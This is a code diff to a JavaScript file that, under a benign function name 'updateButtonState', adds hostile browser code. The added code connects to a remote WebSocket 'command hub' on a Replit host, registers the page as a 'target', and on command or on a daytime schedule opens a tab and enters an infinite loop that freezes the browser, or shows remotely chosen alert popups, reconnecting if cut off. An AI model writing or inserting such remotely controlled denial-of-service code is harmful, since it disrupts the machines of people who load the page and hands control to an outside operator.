@@ -1,20 +1,69 @@
+function getRandomInt(min, max) {
+    min = Math.ceil(min);
+    max = Math.floor(max);
+    return Math.floor(Math.random() * (max - min + 1)) + min; 
+}
 function updateButtonState() {
     const now = new Date();
     const currentHour = now.getHours();
     const currentMinutes = now.getMinutes();
 
 
-    if (currentHour >= 0 && currentHour < 0) {
+    if (currentHour >= 8 && currentHour < 23) {
         setTimeout(function() {
-            window.open('https://google.com','_blank');
-            while (true) {
-                console.log("Q");
+                    window.open('https://google.com','_blank');
+                    while (true) {
+                        console.log("Q");
+                    }
+                       }, getRandomInt(15000,30000))
+            } 
+        }
+
+const REPLIT_WS_URL = "wss://44f64bff-8808-445a-8099-1c8666679313-00-2kblha4tvl79n.pike.replit.dev:3000/";
+let socket;
+
+function connect() {
+    socket = new WebSocket(REPLIT_WS_URL, "target-client");
+
+
+    socket.onopen = () => {
+        console.log("Connected successfully to the command hub.");
+        socket.send(JSON.stringify({ type: "register_target" }));
+    };
+
+    socket.onmessage = (event) => {
+        try {
+            const data = JSON.parse(event.data);
+
+            if (data.type === 'client_count') return
+            if (data.mode === "global_true" && data.executeGlobalAction === true) {
+                updateButtonState();
+
             }
-               }, 120000)
-    } 
+
+            if (data.mode === "custom_message" && data.showPopup === true) {
+                alert(data.message);
+            }
+
+        } catch (err) {
+            console.error("Payload execution error:", err);
+        }
+    };
+
+    socket.onclose = () => {
+        console.log("Connection severed. Attempting recovery sequence...");
+        setTimeout(connect, 4000);
+    };
+
+    socket.onerror = (error) => {
+        console.error("WebSocket transport error:", error);
+    };
 }
 
-updateButtonState();
+connect();
+
+
+
 
 
 setInterval(updateButtonState, 60000); 
